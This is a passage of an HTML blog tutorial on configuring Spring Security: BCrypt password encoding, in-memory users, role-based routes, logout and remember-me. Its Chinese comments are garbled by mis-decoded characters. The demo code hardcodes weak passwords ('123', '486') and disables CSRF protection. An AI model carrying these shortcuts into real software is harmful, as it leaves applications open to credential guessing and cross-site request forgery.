punctuation">&#123;</span>        <span class="token comment">//ä¸‹é¢è¿™ä¸¤è¡Œé…ç½®è¡¨ç¤ºåœ¨å†…å­˜ä¸­é…ç½®äº†ä¸¤ä¸ªç”¨æˆ·</span>        auth<span class="token punctuation">.</span><span class="token function">inMemoryAuthentication</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">withUser</span><span class="token punctuation">(</span><span class="token string">"gbc"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">roles</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">password</span><span class="token punctuation">(</span><span class="token string">"$2a$12$D8ZZt6NMhpoPTzMhZqpVIO..gzDIXr/ryuzeOFR89UzdP28s1QGoe"</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">and</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">withUser</span><span class="token punctuation">(</span><span class="token string">"nina"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">roles</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">password</span><span class="token punctuation">(</span><span class="token string">"$2a$12$D8ZZt6NMhpoPTzMhZqpVIO..gzDIXr/ryuzeOFR89UzdP28s1QGoe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token class-name">PasswordEncoder</span> <span class="token function">passwordEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">BCryptPasswordEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œæˆ‘ä»¬åœ¨ configure æ–¹æ³•ä¸­é…ç½®äº†ä¸¤ä¸ªç”¨æˆ·ï¼Œç”¨æˆ·çš„å¯†ç éƒ½æ˜¯BcryptåŠ å¯†ä¹‹åçš„å­—ç¬¦ä¸²(æ˜æ–‡æ˜¯ 123)</p><p>ï¼ˆä» Spring5 å¼€å§‹ï¼Œå¼ºåˆ¶è¦æ±‚å¯†ç è¦åŠ å¯†ï¼Œå¦‚æœéä¸æƒ³åŠ å¯†ï¼Œå¯ä»¥ä½¿ç”¨ä¸€ä¸ªè¿‡æœŸçš„ PasswordEncoder çš„å®ä¾‹ <code>NoOpPasswordEncoder</code>ï¼‰</p></li><li><p><strong>é€šè¿‡ Java ä»æ•°æ®åº“ä¸­åŠ è½½</strong>ï¼šå’•äº†ï¼Œä¸æƒ³ç¢°æ•°æ®åº“</p></li></ul><h4 id="BCryptPasswordEncoder"><a href="#BCryptPasswordEncoder" class="headerlink" title="BCryptPasswordEncoder"></a>BCryptPasswordEncoder</h4><p>BCryptå¯ä»¥å¯¹å¯†ç åšæ…¢æ•£åˆ—ï¼Œç„¶åå­˜å‚¨ã€‚</p><p>BCryptVersion æœ‰å¤šä¸ªç‰ˆæœ¬ï¼š$2aã€$2yã€$2bï¼ˆè§ BCryptVersionæšä¸¾ç±»ï¼‰ï¼Œé»˜è®¤$2aã€‚</p><p>BCryptå¯†ç å¼ºåº¦ï¼š4~31ï¼Œè¿˜å¯ä»¥è®¾ç½®ä¸€ä¸ªéšæœºæ•°å­—â€”â€”ç”¨äºåŠ ç›ï¼Œé»˜è®¤10ã€‚</p><p>BCryptPasswordEncoderçš„æ„é€ å‡½æ•°ç­¾åï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">BCryptPasswordEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">BCryptPasswordEncoder</span><span class="token punctuation">(</span><span class="token keyword">int</span> strength<span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">BCryptPasswordEncoder</span><span class="token punctuation">(</span><span class="token class-name">BCryptVersion</span> version<span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">BCryptPasswordEncoder</span><span class="token punctuation">(</span><span class="token class-name">BCryptVersion</span> version<span class="token punctuation">,</span> <span class="token class-name">SecureRandom</span> random<span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">BCryptPasswordEncoder</span><span class="token punctuation">(</span><span class="token keyword">int</span> strength<span class="token punctuation">,</span> <span class="token class-name">SecureRandom</span> random<span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">BCryptPasswordEncoder</span><span class="token punctuation">(</span><span class="token class-name">BCryptVersion</span> version<span class="token punctuation">,</span> <span class="token keyword">int</span> strength<span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token class-name">BCryptPasswordEncoder</span><span class="token punctuation">(</span><span class="token class-name">BCryptVersion</span> version<span class="token punctuation">,</span> <span class="token keyword">int</span> strength<span class="token punctuation">,</span> <span class="token class-name">SecureRandom</span> random<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯¹å¯†ç åšæ•£åˆ—åçš„å€¼ï¼š</p><pre class="line-numbers language-none"><code class="language-none"># å¼ºåº¦ä¸º 12å¯†ç ï¼š123$2a$12$D8ZZt6NMhpoPTzMhZqpVIO..gzDIXr&#x2F;ryuzeOFR89UzdP28s1QGoeå¯†ç ï¼š123456$2a$12$8SKvIlSNNQlI0u3GqABk2uFQ&#x2F;5NygMm9rCuyERb1CUybeboDntCyGå¯†æ–‡ç”±4æ®µç»„æˆï¼š# $2a ç‰ˆæœ¬# $12 å¼ºåº¦# $2a$12åå‰22ä½ éšæœºç›å€¼# æœ€å31ä½ çœŸæ­£çš„æ•£åˆ—å€¼<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="ç™»å½•é…ç½®"><a href="#ç™»å½•é…ç½®" class="headerlink" title="ç™»å½•é…ç½®"></a>ç™»å½•é…ç½®</h3><p>ä¾æ—§æ˜¯åœ¨ WebSecurityConfigurerAdapter çš„å®ç°ç±»ä¸­è¿›è¡Œé…ç½®</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SecurityConfig</span> <span class="token keyword">extends</span> <span class="token class-name">WebSecurityConfigurerAdapter</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">configure</span><span class="token punctuation">(</span><span class="token class-name">HttpSecurity</span> http<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        http<span class="token punctuation">.</span><span class="token function">authorizeRequests</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// å¼€å¯ç™»å½•é…ç½®</span>            <span class="token punctuation">.</span><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/hello"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">permitAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">//è¡¨ç¤ºè®¿é—® /hello è¿™ä¸ªæ¥å£ï¼Œæ‰€æœ‰è§’è‰²éƒ½å¯è®¿é—®</span>            <span class="token punctuation">.</span><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/admin"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasRole</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span>    <span class="token comment">// åªæœ‰ admin è§’è‰²èƒ½è®¿é—®è¿™ä¸ªè·¯ç”±</span>            <span class="token punctuation">.</span><span class="token function">anyRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">authenticated</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">//è¡¨ç¤ºå‰©ä½™çš„å…¶ä»–æ¥å£ï¼Œç™»å½•ä¹‹åå°±èƒ½è®¿é—®</span>            <span class="token punctuation">.</span><span class="token function">and</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">formLogin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// å®šä¹‰ç™»å½•é¡µé¢ï¼Œæœªç™»å½•æ—¶ï¼Œè®¿é—®ä¸€ä¸ªéœ€è¦ç™»å½•ä¹‹åæ‰èƒ½è®¿é—®çš„æ¥å£ï¼Œä¼šè‡ªåŠ¨è·³è½¬åˆ°è¯¥é¡µé¢</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æˆ‘ä»¬è¦æ˜¯ä»¥éadminçš„è§’è‰²è®¿é—®&#x2F;adminè·¯ç”±çš„è¯å°±ä¼šæœ‰ä¸‹é¢çš„å›æ˜¾ï¼š</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240715171904192.png" alt="image-20240715171904192"></p><p>æ¥ä¸‹æ¥å†åŠ ä¸Šä¸Šé¢çš„è´¦å¯†é…ç½®ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SecurityConfig</span> <span class="token keyword">extends</span> <span class="token class-name">WebSecurityConfigurerAdapter</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">configure</span><span class="token punctuation">(</span><span class="token class-name">HttpSecurity</span> http<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        http<span class="token punctuation">.</span><span class="token function">authorizeRequests</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// å¼€å¯ç™»å½•é…ç½®</span>            <span class="token punctuation">.</span><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/hello"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">permitAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">//è¡¨ç¤ºè®¿é—® /hello è¿™ä¸ªæ¥å£ï¼Œæ‰€æœ‰è§’è‰²éƒ½å¯è®¿é—®</span>            <span class="token punctuation">.</span><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/admin"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasRole</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span>    <span class="token comment">// åªæœ‰ admin è§’è‰²èƒ½è®¿é—®è¿™ä¸ªè·¯ç”±</span>            <span class="token punctuation">.</span><span class="token function">anyRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">authenticated</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">//è¡¨ç¤ºå‰©ä½™çš„å…¶ä»–æ¥å£ï¼Œç™»å½•ä¹‹åå°±èƒ½è®¿é—®</span>            <span class="token punctuation">.</span><span class="token function">and</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">formLogin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// å®šä¹‰ç™»å½•é¡µé¢ï¼Œæœªç™»å½•æ—¶ï¼Œè®¿é—®ä¸€ä¸ªéœ€è¦ç™»å½•ä¹‹åæ‰èƒ½è®¿é—®çš„æ¥å£ï¼Œä¼šè‡ªåŠ¨è·³è½¬åˆ°è¯¥é¡µé¢</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">configure</span><span class="token punctuation">(</span><span class="token class-name">AuthenticationManagerBuilder</span> auth<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// å¯†ç ç¼–ç ï¼šPasswordEncoder</span>        auth<span class="token punctuation">.</span><span class="token function">inMemoryAuthentication</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">passwordEncoder</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BCryptPasswordEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">withUser</span><span class="token punctuation">(</span><span class="token string">"gbc"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">roles</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">password</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BCryptPasswordEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token string">"486"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">and</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">withUser</span><span class="token punctuation">(</span><span class="token string">"nina"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">roles</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">password</span><span class="token punctuation">(</span><span class="token string">"$2a$12$D8ZZt6NMhpoPTzMhZqpVIO..gzDIXr/ryuzeOFR89UzdP28s1QGoe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»è€Œå®ç°äº†è®¤è¯å’Œæˆæƒ</p><p>æ¥ä¸‹æ¥æ·»åŠ æ³¨é”€åŠŸèƒ½ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">configure</span><span class="token punctuation">(</span><span class="token class-name">HttpSecurity</span> http<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>    http<span class="token punctuation">.</span><span class="token function">authorizeRequests</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// å¼€å¯ç™»å½•é…ç½®</span>        <span class="token punctuation">.</span><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/hello"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">permitAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">//è¡¨ç¤ºè®¿é—® /hello è¿™ä¸ªæ¥å£ï¼Œæ‰€æœ‰è§’è‰²éƒ½å¯è®¿é—®</span>        <span class="token punctuation">.</span><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/admin"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasRole</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span>    <span class="token comment">// åªæœ‰ admin è§’è‰²èƒ½è®¿é—®è¿™ä¸ªè·¯ç”±</span>        <span class="token punctuation">.</span><span class="token function">anyRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">authenticated</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">//è¡¨ç¤ºå‰©ä½™çš„å…¶ä»–æ¥å£ï¼Œç™»å½•ä¹‹åå°±èƒ½è®¿é—®</span>        <span class="token punctuation">.</span><span class="token function">and</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">formLogin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// å®šä¹‰ç™»å½•é¡µé¢ï¼Œæœªç™»å½•æ—¶ï¼Œè®¿é—®ä¸€ä¸ªéœ€è¦ç™»å½•ä¹‹åæ‰èƒ½è®¿é—®çš„æ¥å£ï¼Œä¼šè‡ªåŠ¨è·³è½¬åˆ°è¯¥é¡µé¢</span>    http<span class="token punctuation">.</span><span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">logoutUrl</span><span class="token punctuation">(</span><span class="token string">"/hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// æ³¨é”€å¹¶è·³è½¬åˆ° /hello</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ ·è®¿é—®&#x2F;logoutå°±å¯ä»¥æ³¨é”€äº†</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240715173012743.png" alt="image-20240715173012743"></p><p>ç„¶åå†æ·»åŠ å‡ ä¸ªå…¶å®ƒçš„åŠŸèƒ½ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">configure</span><span class="token punctuation">(</span><span class="token class-name">HttpSecurity</span> http<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>    http<span class="token punctuation">.</span><span class="token function">authorizeRequests</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// å¼€å¯ç™»å½•é…ç½®</span>        <span class="token punctuation">.</span><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/hello"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">permitAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">//è¡¨ç¤ºè®¿é—® /hello è¿™ä¸ªæ¥å£ï¼Œæ‰€æœ‰è§’è‰²éƒ½å¯è®¿é—®</span>        <span class="token punctuation">.</span><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/admin"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasRole</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span>    <span class="token comment">// åªæœ‰ admin è§’è‰²èƒ½è®¿é—®è¿™ä¸ªè·¯ç”±</span>        <span class="token punctuation">.</span><span class="token function">anyRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">authenticated</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">//è¡¨ç¤ºå‰©ä½™çš„å…¶ä»–æ¥å£ï¼Œç™»å½•ä¹‹åå°±èƒ½è®¿é—®</span>        <span class="token punctuation">.</span><span class="token function">and</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">formLogin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// å®šä¹‰ç™»å½•é¡µé¢ï¼Œæœªç™»å½•æ—¶ï¼Œè®¿é—®ä¸€ä¸ªéœ€è¦ç™»å½•ä¹‹åæ‰èƒ½è®¿é—®çš„æ¥å£ï¼Œä¼šè‡ªåŠ¨è·³è½¬åˆ°è¯¥é¡µé¢</span>    http<span class="token punctuation">.</span><span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">logoutUrl</span><span class="token punctuation">(</span><span class="token string">"/hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// æ³¨é”€å¹¶è·³è½¬åˆ° /hello</span>    http<span class="token punctuation">.</span><span class="token function">csrf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">disable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// å…³é—­csrfåŠŸèƒ½</span>    http<span class="token punctuation">.</span><span class="token function">rememberMe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rememberMeParameter</span><span class="token punctuation">(</span><span class="token string">"remember"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// è®°ä½æˆ‘ï¼Œé»˜è®¤ä¿å­˜ä¸¤å‘¨ï¼Œå¯ä»¥è‡ªå®šä¹‰æ¥æ”¶å‰ç«¯çš„å‚æ•°</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ±‡æ€»ä¸€ä¸‹ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">org<span class="token punctuation">.</span>example<span class="token punctuation">.</span>springsecuritydemo<span class="token punctuation">.</span></span><span class="token class-name">Config</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Bean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>authentication<span class="token punctuation">.</span>builders<span class="token punctuation">.</span></span><span class="token class-name">AuthenticationManagerBuilder</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>web<span class="token punctuation">.</span>builders<span class="token punctuation">.</span></span><span class="token class-name">HttpSecurity</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>web<span class="token punctuation">.</span>configuration<span class="token punctuation">.</span></span><span class="token class-name">WebSecurityConfigurerAdapter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>bcrypt<span class="token punctuation">.</span></span><span class="token class-name">BCryptPasswordEncoder</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>crypto<span class="token punctuation">.</span>password<span class="token punctuation">.</span></span><span class="token class-name">PasswordEncoder</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SecurityConfig</span> <span class="token keyword">extends</span> <span class="token class-name">WebSecurityConfigurerAdapter</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">configure</span><span class="token punctuation">(</span><span class="token class-name">HttpSecurity</span> http<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        http<span class="token punctuation">.</span><span class="token function">authorizeRequests</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// å¼€å¯ç™»å½•é…ç½®</span>            <span class="token punctuation">.</span><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/hello"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">permitAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">//è¡¨ç¤ºè®¿é—® /hello è¿™ä¸ªæ¥å£ï¼Œæ‰€æœ‰è§’è‰²éƒ½å¯è®¿é—®</span>            <span class="token punctuation">.</span><span class="token function">antMatchers</span><span class="token punctuation">(</span><span class="token string">"/admin"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasRole</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span>    <span class="token comment">// åªæœ‰ admin è§’è‰²èƒ½è®¿é—®è¿™ä¸ªè·¯ç”±</span>            <span class="token punctuation">.</span><span class="token function">anyRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">authenticated</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment">//è¡¨ç¤ºå‰©ä½™çš„å…¶ä»–æ¥å£ï¼Œç™»å½•ä¹‹åå°±èƒ½è®¿é—®</span>            <span class="token punctuation">.</span><span class="token function">and</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">formLogin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// å®šä¹‰ç™»å½•é¡µé¢ï¼Œæœªç™»å½•æ—¶ï¼Œè®¿é—®ä¸€ä¸ªéœ€è¦ç™»å½•ä¹‹åæ‰èƒ½è®¿é—®çš„æ¥å£ï¼Œä¼šè‡ªåŠ¨è·³è½¬åˆ°è¯¥é¡µé¢</span>        http<span class="token punctuation">.</span><span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">logoutUrl</span><span class="token punctuation">(</span><span class="token string">"/hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// æ³¨é”€å¹¶è·³è½¬åˆ° /hello</span>        http<span class="token punctuation">.</span><span class="token function">csrf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">disable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// å…³é—­csrfåŠŸèƒ½</span>        http<span class="token punctuation">.</span><span class="token function">rememberMe</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rememberMeParameter</span><span class="token punctuation">(</span><span class="token string">"remember"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// è®°ä½æˆ‘ï¼Œé»˜è®¤ä¿å­˜ä¸¤å‘¨ï¼Œå¯ä»¥è‡ªå®šä¹‰æ¥æ”¶å‰ç«¯çš„å‚æ•°</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">configure</span><span class="token punctuation">(</span><span class="token class-name">AuthenticationManagerBuilder</span> auth<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// å¯†ç ç¼–ç ï¼šPasswordEncoder</span>        auth<span class="token punctuation">.</span><span class="token function">inMemoryAuthentication</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">passwordEncoder</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BCryptPasswordEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">withUser</span><span class="token punctuation">(</span><span class="token string">"gbc"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">roles</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">password</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BCryptPasswordEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token string">"486"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">and</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">withUser</span><span class="token punctuation">(</span><span class="token string">"nina"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">roles</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">password</span><span class="token punctuation">(</span><span class="token string">"$2a$12$D8ZZt6NMhpoPTzMhZqpVIO..gzDIXr/ryuzeOFR89UzdP28s1QGoe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" 